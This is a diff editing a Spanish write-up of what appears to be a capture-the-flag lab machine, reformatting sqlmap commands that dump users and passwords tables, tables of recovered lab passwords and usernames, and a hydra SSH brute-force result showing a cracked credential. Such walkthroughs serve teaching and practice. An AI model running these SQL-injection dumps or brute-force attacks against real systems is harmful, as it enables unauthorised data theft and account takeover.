@@ -188,14 +188,6 @@ Una vez que se tiene el request se lanza el comando para capturar la base cracko
 
 web application technology: Apache 2.4.58
 back-end DBMS: MySQL >= 5.0.12
-[19:46:57] [INFO] fetching database names
-[19:46:57] [INFO] fetching number of databases
-[19:46:57] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
-[19:46:57] [INFO] retrieved: 4
-[19:46:57] [INFO] retrieved: information_schema
-[19:46:58] [INFO] retrieved: performance_schema
-[19:46:59] [INFO] retrieved: crackoff_db
-[19:47:00] [INFO] retrieved: crackofftrue_db
 available databases [4]:
 [*] crackoff_db
 [*] crackofftrue_db
@@ -204,13 +196,19 @@ available databases [4]:
 ```
 
 ```bash
-# Dumpeo de la tabla de usuarios sqlmap -r request.txt --batch -D crackoff_db -T users --dump # Dumpeo de la tabla de contraseñas sqlmap -r request.txt --batch -D crackoff_db -T passwords --dump
+```bash
+# Dumpeo de la tabla de usuarios
+sqlmap -r request.txt --batch -D crackoff_db -T users --dump
 
-# Columnas:
+# Dumpeo de la tabla de contraseñas
+sqlmap -r request.txt --batch -D crackoff_db -T passwords --dump
+
+# Columnas de la tabla passwords
 sqlmap -r request.txt --batch -D crackoff_db -T passwords --columns
 
-# Dump total:
+# Dump parcial (columnas específicas)
 sqlmap -r request.txt --batch -D crackoff_db -T passwords -C name,id --dump
+
 ```
 
 
@@ -230,8 +228,8 @@ sqlmap -r request.txt --batch -D crackoff_db -T passwords -C name,id --dump
 | 10     | `admin12345password`        |                                                       |
 | 11     | `carsisgood`                |                                                       |
 | 12     | `badmenandwomen`            |                                                       |
-| 13     | superalicepassword          |                                                       |
-| 14     | flowerpower                 | ----> /var/www/alice_note/note.txt  acceso al keepass |
+| 13     | `superalicepassword`        |                                                       |
+| 14     | `flowerpower`               | ----> /var/www/alice_note/note.txt  acceso al keepass |
 
 ### Tabla: `users`
 
@@ -244,7 +242,7 @@ Listado de identidades del sistema recuperadas de `crackoff_db`.
 | 3      | **`alice`**    | Propietaria de KeePass / Root vector |
 | 8      | **`rosa`**     | **Punto de entrada SSH**             |
 | 9      | **`mario`**    | Usuario intermedio                   |
-| 11     | `root`         | Objetivo Final                       |
+| 11     | **`root`**     | Objetivo Final                       |
 
 
 
@@ -273,7 +271,7 @@ hydra -L users.txt -P credenciales.txt ssh://172.17.0.2 -t4 -f -V -Z
 
 El ataque fue exitoso, identificando una credencial válida para el usuario **rosa**:
 
-```Bash
+```txt
 [22][ssh] host: 172.17.0.2   login: rosa   password: ultramegaverypasswordhack
 ```
 
